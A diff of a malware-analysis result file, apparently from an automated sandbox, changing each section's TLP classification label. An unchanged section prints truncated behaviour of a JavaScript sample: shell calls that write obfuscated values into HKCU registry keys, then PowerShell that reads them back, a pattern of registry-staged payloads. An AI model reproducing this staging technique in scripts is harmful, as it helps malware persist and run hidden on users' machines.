@@ -7,7 +7,7 @@
         "auto_collapse": false,
         "body": null,
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {},
@@ -18,7 +18,7 @@
         "auto_collapse": false,
         "body": "JavaScript runs code via shell application\n\t\tShell.Application[9].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v TheoremsUniride...\n\t\tShell.Application[10].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v Negatives /d h...\n\t\tShell.Application[11].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v desightSollari...\n\t\tShell.Application[12].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v Morass /d NWNa...\n\t\tShell.Application[13].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v westernmost /d AG...\n\t\tShell.Application[14].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v ScalarwiseDevacha...\n\t\tShell.Application[15].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v Foreordainment /d...\n\t\tShell.Application[16].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v swampberrySulpham...\n\t\tShell.Application[17].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v Nonliturgic /d ip...\n\t\tShell.Application[18].shellexecute(\"powershell\", \"$besmearedUnexcited = Get-ItemProperty -Path HKCU:...",
         "body_format": "TEXT",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 1,
         "heuristic": {
           "attack_ids": [],
@@ -40,7 +40,7 @@
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"support.microsoft.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://support.microsoft.com/office/troubleshoot-errors-in-onenote-for-windows-10-942b006c-46ac-4300-a629-7fac5ae4dc70\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/office/troubleshoot-errors-in-onenote-for-windows-10-942b006c-46ac-4300-a629-7fac5ae4dc70\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
